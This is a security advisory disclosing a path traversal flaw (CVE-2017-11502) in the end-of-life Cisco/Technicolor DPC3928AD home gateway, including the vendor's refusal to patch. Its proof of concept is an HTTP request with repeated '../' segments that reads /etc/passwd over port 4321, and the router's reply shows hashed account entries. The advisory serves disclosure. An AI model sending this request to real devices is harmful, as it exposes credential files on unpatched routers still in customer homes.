## Vulnerability Summary
The following advisory describes an arbitrary file disclosure vulnerability found in Cisco DPC3928AD DOCSIS 3.0 2-PORT Voice Gateway.

The Cisco DPC3928AD DOCSIS is a home wireless router that is currently "Out of support" but is provided by ISPs world wide.

## Credit
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

## Vendor response
We reported the vulnerability to Cisco and they informed us that the Cisco DPC3928AD sold to Technicolor: “The Cisco DPC3928AD was actually sold to Technicolor a while back. In this case, we will ask you to please contact Technicolor at security@technicolor.com to open a case with them”

After connecting Technicolor, they informed us that the product has reached end of life and they will not patch the vulnerability: “After an extensive search for the product to perform validation, we were unable to source the gateway to validate your proof of concept. Due to the end-of-sale and end-of-life of the product Technicolor will not be patching the bug.”

CVE: CVE-2017-11502

## Vulnerability details
Cisco DPC3928AD DOCSIS 3.0 2-PORT Voice Gateway vulnerability is present on its TCP/4321 port .

## Proof of Concept
An attacker can get the /etc/passwd file from the remote device, by sending the following request:


```
GET /../../../../../../../../../../../../../../../../etc/passwd
HTTP/1.1
Host: 192.168.0.10:4321
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```

The Router response the next output with the passwd content:

```
HTTP/1.1 200 OK
Content-Type: text/html
SERVER: Linux/#2 Wed Nov 12 10:23:46 CST 2014 UPnP/1.0 Broadcom
UPNP/0.9
Content-Length: 247
Accept-Ranges: bytes
Date: Thu, 10 Nov 2016 16:01:04 GMT

root:HAdbdMWcXHOuKQ:0:0:root:/:/bin/sh
admin:KASJakljhHqiuJ:0:0:aDMINISTRATOR:/:/bin/false
```